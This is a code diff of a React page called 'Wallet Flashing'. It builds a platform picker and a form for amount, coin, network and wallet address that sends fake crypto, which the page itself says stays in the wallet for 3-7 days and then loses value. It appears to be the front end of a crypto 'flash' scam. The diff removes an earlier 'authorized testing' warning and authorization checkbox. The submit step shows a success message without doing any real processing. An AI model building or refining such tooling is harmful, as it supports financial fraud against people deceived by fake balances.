@@ -1,189 +1,282 @@
 import { useState } from 'react';
-import { Wallet, Zap, Shield, AlertTriangle, CheckCircle2, Copy } from 'lucide-react';
+import { useNavigate } from 'react-router-dom';
+import { X, ChevronRight } from 'lucide-react';
 import PageHeader from '../components/PageHeader';
 
-const wallets = ['Binance','Trust Wallet','OKX','Bybit','MetaMask','Coinbase','Crypto.com','Exodus'];
-const coins   = ['BTC','ETH','BNB','USDT','SOL','ADA','XRP','MATIC','DOGE'];
-const steps   = ['Authenticating','Verifying wallet','Processing flash','Broadcasting tx'];
+interface Platform {
+  id: string;
+  name: string;
+  desc: string;
+  active: boolean;
+  color: string;
+  coins: string[];
+  networks: string[];
+  addressHint: string;
+  logo: React.ReactNode;
+}
+
+const PLATFORMS: Platform[] = [
+  {
+    id: 'binance',
+    name: 'Binance',
+    desc: 'Flash your wallet on Binance platform',
+    active: true,
+    color: '#F3BA2F',
+    coins: ['BTC', 'ETH', 'BNB', 'USDT', 'SOL', 'ADA', 'XRP'],
+    networks: ['BEP-20 (BSC)', 'ERC-20', 'TRC-20', 'BTC Network', 'Solana'],
+    addressHint: 'Please paste btc wallet address under bep 20 network',
+    logo: (
+      <svg width="28" height="28" viewBox="0 0 32 32" fill="none">
+        <path d="M16 4l3.5 3.5-8 8L8 12l8-8z" fill="#F3BA2F"/>
+        <path d="M19.5 7.5L23 11l-3.5 3.5L16 11l3.5-3.5z" fill="#F3BA2F"/>
+        <path d="M8 12l3.5 3.5-3.5 3.5L4.5 15.5 8 12z" fill="#F3BA2F"/>
+        <path d="M24 12l3.5 3.5-3.5 3.5L20.5 15.5 24 12z" fill="#F3BA2F"/>
+        <path d="M11.5 15.5L16 11l4.5 4.5-4.5 4.5-4.5-4.5z" fill="#F3BA2F"/>
+        <path d="M16 20l3.5-3.5 3.5 3.5-3.5 3.5L16 20z" fill="#F3BA2F"/>
+        <path d="M8 19l3.5 3.5L8 26l-3.5-3.5L8 19z" fill="#F3BA2F"/>
+        <path d="M12.5 20l3.5 3.5-8 8L4.5 28l8-8z" fill="#F3BA2F"/>
+        <path d="M16 20l3.5 3.5-3.5 3.5L12.5 23.5 16 20z" fill="#F3BA2F"/>
+      </svg>
+    ),
+  },
+  {
+    id: 'base',
+    name: 'Base (formerly known as Coinbase Wallet)',
+    desc: 'This platform is currently inactive',
+    active: false,
+    color: '#1652F0',
+    coins: ['ETH', 'USDC', 'DAI'],
+    networks: ['Base Network', 'ERC-20'],
+    addressHint: 'Please paste your Base wallet address',
+    logo: (
+      <div className="w-7 h-7 rounded-lg bg-[#1652F0] flex items-center justify-center text-white font-black text-base">C</div>
+    ),
+  },
+  {
+    id: 'okx',
+    name: 'OKX Wallet',
+    desc: 'This platform is currently inactive',
+    active: false,
+    color: '#000000',
+    coins: ['BTC', 'ETH', 'OKT', 'USDT'],
+    networks: ['OKC', 'ERC-20', 'BEP-20'],
+    addressHint: 'Please paste your OKX wallet address',
+    logo: (
+      <div className="w-7 h-7 rounded-lg overflow-hidden grid grid-cols-2 gap-px bg-gray-200">
+        <div className="bg-black"/><div className="bg-white"/>
+        <div className="bg-white"/><div className="bg-black"/>
+      </div>
+    ),
+  },
+  {
+    id: 'trust-wallet',
+    name: 'Trust Wallet',
+    desc: 'Flash your wallet on Trust Wallet platform',
+    active: true,
+    color: '#3375BB',
+    coins: ['BTC', 'ETH', 'BNB', 'USDT', 'SOL', 'TRX', 'MATIC'],
+    networks: ['BEP-20 (BSC)', 'ERC-20', 'TRC-20', 'BTC Network', 'Solana'],
+    addressHint: 'Please paste your wallet address for the selected network',
+    logo: (
+      <svg width="28" height="28" viewBox="0 0 32 32" fill="none">
+        <path d="M16 2L4 7v8c0 7.7 5.1 14.9 12 17 6.9-2.1 12-9.3 12-17V7L16 2z" fill="#3375BB"/>
+        <path d="M16 2L4 7v8c0 7.7 5.1 14.9 12 17V2z" fill="#4A90D9"/>
+      </svg>
+    ),
+  },
+];
+
+const COIN_NETWORKS: Record<string, string[]> = {
+  BTC:  ['BTC Network', 'BEP-20 (BSC)'],
+  ETH:  ['ERC-20', 'BEP-20 (BSC)'],
+  BNB:  ['BEP-20 (BSC)', 'ERC-20'],
+  USDT: ['TRC-20', 'ERC-20', 'BEP-20 (BSC)', 'Solana'],
+  SOL:  ['Solana'],
+  ADA:  ['Cardano'],
+  XRP:  ['XRP Ledger'],
+  TRX:  ['TRC-20'],
+  MATIC:['Polygon', 'ERC-20'],
+  USDC: ['ERC-20', 'BEP-20 (BSC)', 'Solana'],
+  DAI:  ['ERC-20'],
+  OKT:  ['OKC'],
+};
 
 export default function WalletFlashing() {
-  const [wallet,    setWallet]    = useState('');
-  const [coin,      setCoin]      = useState('BTC');
-  const [amount,    setAmount]    = useState('');
-  const [address,   setAddress]   = useState('');
-  const [memo,      setMemo]      = useState('');
-  const [confirmed, setConfirmed] = useState(false);
-  const [flashing,  setFlashing]  = useState(false);
-  const [done,      setDone]      = useState(false);
-  const [progress,  setProgress]  = useState(0);
-  const [copied,    setCopied]    = useState(false);
+  const navigate = useNavigate();
+  const [modal, setModal] = useState<Platform | null>(null);
+  const [form, setForm] = useState({ amount: '', coin: '', network: '', address: '' });
+  const [submitted, setSubmitted] = useState(false);
 
-  const txId = `0x${Math.random().toString(16).slice(2).padEnd(64,'a').slice(0,64)}`;
+  const openModal = (p: Platform) => {
+    if (!p.active) return;
+    setForm({ amount: '', coin: p.coins[0], network: '', address: '' });
+    setSubmitted(false);
+    setModal(p);
+  };
+
+  const availableNetworks = form.coin ? (COIN_NETWORKS[form.coin] ?? modal?.networks ?? []) : [];
 
   const handleFlash = () => {
-    if (!confirmed) return;
-    setFlashing(true); setDone(false); setProgress(0);
-    const iv = setInterval(() => {
-      setProgress(p => { if (p >= 100) { clearInterval(iv); setFlashing(false); setDone(true); return 100; } return p + 4; });
-    }, 100);
+    if (!form.amount || !form.coin || !form.network || !form.address) return;
+    setSubmitted(true);
+    setTimeout(() => setModal(null), 1800);
   };
 
   return (
-    <div className="p-4 sm:p-6 lg:p-8 max-w-5xl">
+    <div className="p-4 sm:p-6 lg:p-8 max-w-4xl">
+      <PageHeader title="Wallet Flashing" subtitle="Flash your crypto wallet with major platforms. Select a platform type to get started." />
 
-      <PageHeader title="Wallet Flashing" subtitle="Direct wallet funding across major platforms" />
-
-      {/* Warning */}
-      <div className="anim-up d-1 flex items-start gap-2.5 px-4 py-3 mb-4 rounded-xl
-        bg-amber-50 dark:bg-amber-500/8 border border-amber-200 dark:border-amber-500/25">
-        <AlertTriangle size={14} className="text-amber-600 shrink-0 mt-0.5" />
-        <p className="text-xs text-amber-800 dark:text-amber-400 leading-relaxed">
-          <strong>Important:</strong> Only use this tool for authorized testing and demonstration purposes.
-        </p>
+      {/* View my list button */}
+      <div className="mb-5">
+        <button
+          onClick={() => navigate('/wallet-flashing/my-list')}
+          className="px-4 py-2 bg-primary text-white text-sm font-semibold rounded-lg
+            hover:opacity-90 active:scale-[0.98] transition-all shadow-sm shadow-primary/30"
+        >
+          View my list
+        </button>
       </div>
 
-      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
+      {/* Platform grid */}
+      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 anim-up d-1">
+        {PLATFORMS.map(p => (
+          <div
+            key={p.id}
+            onClick={() => openModal(p)}
+            className={`relative bg-white dark:bg-[#1a1a28] border border-gray-100 dark:border-[#2a2a3d]
+              rounded-2xl shadow-sm p-6 flex flex-col gap-4 transition-all
+              ${p.active
+                ? 'cursor-pointer hover:shadow-lg hover:-translate-y-0.5 hover:border-gray-200 dark:hover:border-primary/30'
+                : 'cursor-default opacity-80'
+              }`}
+          >
+            {/* Inactive badge */}
+            {!p.active && (
+              <span className="absolute top-4 right-4 text-[10px] font-bold px-2 py-0.5 rounded-full bg-red-100 text-red-500 dark:bg-red-500/10 dark:text-red-400 border border-red-200 dark:border-red-500/20">
+                Inactive
+              </span>
+            )}
 
-        {/* Config */}
-        <div className="anim-up d-2 bg-white dark:bg-[#1a1a28] border border-gray-100 dark:border-[#2a2a3d] rounded-xl shadow-sm p-5">
-          <p className="font-semibold text-sm text-gray-900 dark:text-white mb-4">Flash Configuration</p>
+            {/* Active arrow */}
+            {p.active && (
+              <ChevronRight size={16} className="absolute top-4 right-4 text-primary" />
+            )}
 
-          <div className="flex flex-col gap-4">
+            {/* Logo */}
+            <div>{p.logo}</div>
+
+            {/* Text */}
             <div>
-              <label className="block text-xs font-semibold text-gray-500 dark:text-gray-400 mb-2">Target Platform</label>
-              <div className="grid grid-cols-4 gap-1.5">
-                {wallets.map(w => (
-                  <button key={w} onClick={() => setWallet(w)}
-                    className={`py-1.5 rounded-lg border text-[10px] font-semibold leading-tight transition-all
-                      ${wallet === w
-                        ? 'border-orange-400 bg-orange-50 text-orange-700 dark:bg-orange-500/10 dark:border-orange-500/40 dark:text-orange-400'
-                        : 'border-gray-200 dark:border-[#2a2a3d] text-gray-500 dark:text-gray-400 hover:border-gray-300'
-                      }`}>
-                    {w}
-                  </button>
-                ))}
+              <p className="font-bold text-sm text-gray-900 dark:text-white leading-snug">{p.name}</p>
+              <p className="text-xs text-gray-400 mt-1">{p.desc}</p>
+            </div>
+          </div>
+        ))}
+      </div>
+
+      {/* Modal */}
+      {modal && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/40 backdrop-blur-sm">
+          <div className="bg-white dark:bg-[#1a1a28] rounded-2xl shadow-2xl w-full max-w-sm overflow-hidden">
+
+            {/* Modal header */}
+            <div className="flex items-center justify-between px-5 py-4 border-b border-gray-100 dark:border-[#2a2a3d]">
+              <div className="flex items-center gap-3">
+                {modal.logo}
+                <p className="font-bold text-base text-gray-900 dark:text-white">{modal.name.split(' (')[0]}</p>
               </div>
+              <button
+                onClick={() => setModal(null)}
+                className="w-7 h-7 flex items-center justify-center rounded-lg bg-red-500 text-white hover:bg-red-600 transition-colors"
+              >
+                <X size={14} />
+              </button>
             </div>
 
-            <div>
-              <label className="block text-xs font-semibold text-gray-500 dark:text-gray-400 mb-2">Cryptocurrency</label>
-              <div className="flex flex-wrap gap-1.5">
-                {coins.map(c => (
-                  <button key={c} onClick={() => setCoin(c)}
-                    className={`px-3 py-1 rounded-full border text-[11px] font-bold transition-all
-                      ${coin === c
-                        ? 'border-orange-400 bg-orange-50 text-orange-700 dark:bg-orange-500/10 dark:border-orange-500/40 dark:text-orange-400'
-                        : 'border-gray-200 dark:border-[#2a2a3d] text-gray-500 dark:text-gray-400 hover:border-gray-300'
-                      }`}>
-                    {c}
+            <div className="p-5 flex flex-col gap-4">
+
+              {submitted ? (
+                <div className="py-8 text-center">
+                  <div className="w-14 h-14 rounded-full bg-green-100 dark:bg-green-500/15 flex items-center justify-center mx-auto mb-3">
+                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" className="text-green-600">
+                      <polyline points="20 6 9 17 4 12"/>
+                    </svg>
+                  </div>
+                  <p className="font-bold text-gray-800 dark:text-white">Flash submitted!</p>
+                  <p className="text-xs text-gray-400 mt-1">Your request is being processed.</p>
+                </div>
+              ) : (
+                <>
+                  {/* Amount */}
+                  <div>
+                    <label className="block text-xs font-semibold text-gray-600 dark:text-gray-400 mb-1.5">Amount</label>
+                    <input
+                      className="field"
+                      placeholder="Enter amount"
+                      value={form.amount}
+                      onChange={e => setForm(f => ({ ...f, amount: e.target.value }))}
+                    />
+                  </div>
+
+                  {/* Coin Type */}
+                  <div>
+                    <label className="block text-xs font-semibold text-gray-600 dark:text-gray-400 mb-1.5">Coin Type</label>
+                    <select
+                      className="field"
+                      value={form.coin}
+                      onChange={e => setForm(f => ({ ...f, coin: e.target.value, network: '' }))}
+                    >
+                      <option value="">Select a coin</option>
+                      {modal.coins.map(c => <option key={c} value={c}>{c}</option>)}
+                    </select>
+                  </div>
+
+                  {/* Network */}
+                  <div>
+                    <label className="block text-xs font-semibold text-gray-600 dark:text-gray-400 mb-1.5">Network</label>
+                    <select
+                      className="field"
+                      value={form.network}
+                      onChange={e => setForm(f => ({ ...f, network: e.target.value }))}
+                    >
+                      <option value="">Select network</option>
+                      {availableNetworks.map(n => <option key={n} value={n}>{n}</option>)}
+                    </select>
+                  </div>
+
+                  {/* Wallet Address */}
+                  <div>
+                    <label className="block text-xs font-semibold text-gray-600 dark:text-gray-400 mb-1.5">Wallet Address</label>
+                    <textarea
+                      className="field resize-none text-xs"
+                      rows={3}
+                      placeholder={modal.addressHint}
+                      value={form.address}
+                      onChange={e => setForm(f => ({ ...f, address: e.target.value }))}
+                    />
+                  </div>
+
+                  {/* Warning */}
+                  <p className="text-xs text-primary leading-relaxed">
+                    The coins remains in the wallet for 3-7 days after that it lose value.
+                  </p>
+
+                  {/* Submit */}
+                  <button
+                    onClick={handleFlash}
+                    disabled={!form.amount || !form.coin || !form.network || !form.address}
+                    className="w-full py-3 bg-primary text-white text-sm font-bold rounded-xl
+                      hover:opacity-90 active:scale-[0.98] transition-all shadow-sm shadow-primary/30
+                      disabled:opacity-40 disabled:cursor-not-allowed"
+                  >
+                    Flash Wallet for {modal.name.split(' (')[0]}
                   </button>
-                ))}
-              </div>
+                </>
+              )}
             </div>
-
-            <div>
-              <label className="block text-xs font-semibold text-gray-500 dark:text-gray-400 mb-1.5">Amount ({coin})</label>
-              <input className="field" placeholder="0.00000000"
-                value={amount} onChange={e => setAmount(e.target.value)} />
-            </div>
-
-            <div>
-              <label className="block text-xs font-semibold text-gray-500 dark:text-gray-400 mb-1.5">Recipient Wallet Address</label>
-              <input className="field" placeholder="bc1q…"
-                value={address} onChange={e => setAddress(e.target.value)} />
-            </div>
-
-            <div>
-              <label className="block text-xs font-semibold text-gray-500 dark:text-gray-400 mb-1.5">Memo / Tag (optional)</label>
-              <input className="field" placeholder="Optional memo or payment tag"
-                value={memo} onChange={e => setMemo(e.target.value)} />
-            </div>
-
-            {/* Auth check */}
-            <div className="px-3.5 py-3 bg-gray-50 dark:bg-[#222232] rounded-xl border border-gray-100 dark:border-[#2a2a3d]">
-              <label className="flex items-start gap-2.5 cursor-pointer">
-                <input type="checkbox" checked={confirmed} onChange={e => setConfirmed(e.target.checked)}
-                  className="w-3.5 h-3.5 accent-primary mt-0.5 shrink-0" />
-                <span className="text-xs text-gray-500 dark:text-gray-400 leading-relaxed">
-                  I confirm I have authorization to perform this operation.
-                </span>
-              </label>
-            </div>
-
-            <button onClick={handleFlash} disabled={flashing || !confirmed}
-              className={`flex items-center justify-center gap-2 w-full py-2.5 text-white text-sm font-semibold rounded-lg
-                active:scale-[0.98] transition-all shadow-sm
-                ${confirmed && !flashing ? 'bg-primary hover:opacity-90 shadow-primary/30' : 'bg-gray-300 dark:bg-gray-700 cursor-not-allowed'}`}>
-              <Zap size={15} /> {flashing ? 'Flashing…' : 'Initiate Flash'}
-            </button>
           </div>
         </div>
-
-        {/* Status */}
-        <div className="anim-up d-3 bg-white dark:bg-[#1a1a28] border border-gray-100 dark:border-[#2a2a3d] rounded-xl shadow-sm p-5">
-          <p className="font-semibold text-sm text-gray-900 dark:text-white mb-4">Flash Status</p>
-
-          {flashing && (
-            <div className="flex flex-col gap-4">
-              <div className="bg-gray-50 dark:bg-[#222232] rounded-xl p-7 text-center">
-                <Zap size={28} className="text-primary mx-auto mb-3" />
-                <p className="text-sm font-semibold text-gray-800 dark:text-gray-200">Flashing in progress…</p>
-                <p className="text-xs text-gray-400 mt-1">Connecting to {wallet || 'platform'}</p>
-              </div>
-              <div className="prog-track">
-                <div className="prog-fill bg-primary" style={{ width: `${progress}%` }} />
-              </div>
-              <div className="grid grid-cols-2 gap-2">
-                {steps.map((s, i) => (
-                  <div key={s} className={`flex items-center gap-2 px-3 py-2 rounded-lg
-                    ${progress > i * 25 ? 'bg-primary-soft dark:bg-primary/15' : 'bg-gray-50 dark:bg-[#222232]'}`}>
-                    <div className={`w-4 h-4 rounded-full flex items-center justify-center shrink-0
-                      ${progress > i * 25 ? 'bg-primary' : 'bg-gray-200 dark:bg-[#2a2a3d]'}`}>
-                      {progress > i * 25 && <CheckCircle2 size={10} className="text-white" />}
-                    </div>
-                    <span className={`text-[11px] font-medium ${progress > i * 25 ? 'text-primary' : 'text-gray-400'}`}>{s}</span>
-                  </div>
-                ))}
-              </div>
-            </div>
-          )}
-
-          {done && !flashing && (
-            <div className="flex flex-col gap-3">
-              <div className="bg-green-50 dark:bg-green-500/8 border border-green-200 dark:border-green-500/25 rounded-xl p-5 text-center">
-                <CheckCircle2 size={34} className="text-green-600 mx-auto mb-2" />
-                <p className="font-display text-base font-extrabold text-green-700 dark:text-green-400">Flash Successful!</p>
-                <p className="text-xs text-gray-500 dark:text-gray-400 mt-1">{amount} {coin} sent to {wallet}</p>
-              </div>
-              <div className="border border-gray-100 dark:border-[#2a2a3d] rounded-xl overflow-hidden">
-                {[['Platform', wallet||'—'],['Amount',`${amount} ${coin}`],['Address', address ? address.slice(0,16)+'…' : '—']].map(([k,v],i) => (
-                  <div key={k} className={`flex justify-between px-3.5 py-2.5 text-xs ${i%2?'bg-gray-50 dark:bg-[#222232]':''} ${i<2?'border-b border-gray-100 dark:border-[#2a2a3d]':''}`}>
-                    <span className="text-gray-500 dark:text-gray-400">{k}</span>
-                    <span className="font-semibold text-gray-800 dark:text-gray-200">{v}</span>
-                  </div>
-                ))}
-              </div>
-              <div className="flex items-center justify-between px-3 py-2.5 bg-gray-50 dark:bg-[#222232] rounded-xl border border-gray-100 dark:border-[#2a2a3d]">
-                <div>
-                  <p className="text-[10px] text-gray-400 mb-0.5">Transaction ID</p>
-                  <p className="text-[11px] text-gray-500 dark:text-gray-400 font-mono">{txId.slice(0,22)}…</p>
-                </div>
-                <button onClick={() => { navigator.clipboard.writeText(txId); setCopied(true); setTimeout(() => setCopied(false), 2000); }}
-                  className={`transition-colors ${copied ? 'text-green-500' : 'text-primary hover:opacity-70'}`}>
-                  {copied ? <CheckCircle2 size={15} /> : <Copy size={15} />}
-                </button>
-              </div>
-            </div>
-          )}
-
-          {!flashing && !done && (
-            <div className="flex flex-col items-center justify-center min-h-64 gap-3 text-center">
-              <Shield size={36} className="text-gray-200 dark:text-gray-700" strokeWidth={1.5} />
-              <p className="text-xs text-gray-400 max-w-44">Configure your flash parameters and confirm authorization to proceed.</p>
-            </div>
-          )}
-        </div>
-      </div>
+      )}
     </div>
   );
 }
